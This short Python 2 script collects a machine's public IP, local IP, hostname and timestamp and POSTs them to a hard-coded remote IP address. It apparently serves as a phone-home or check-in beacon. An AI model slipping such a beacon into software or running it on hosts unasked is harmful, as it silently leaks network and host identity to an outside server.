#!/usr/bin/env python2
import socket
import sys
import requests
import time
from datetime import datetime
import urllib
from urllib2 import urlopen

def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		s.connect(('10.255.255.255', 1))
		IP = s.getsockname()[0]
	except:
		IP =  '127.0.0.1'
	finally:
		s.close()
	return IP

#Droni left a comment to tert github! Jah Bless!
my_ip = urlopen('http://ip.42.pl/raw').read()
message = my_ip + "," + datetime.now().strftime('%Y-%m-%d,%H:%M:%S') + "," + socket.gethostname() + "," + get_ip()
print message

url = "http://34.242.70.77/upload/"
data = { 'content' : message }

r = requests.post(url, data=data)

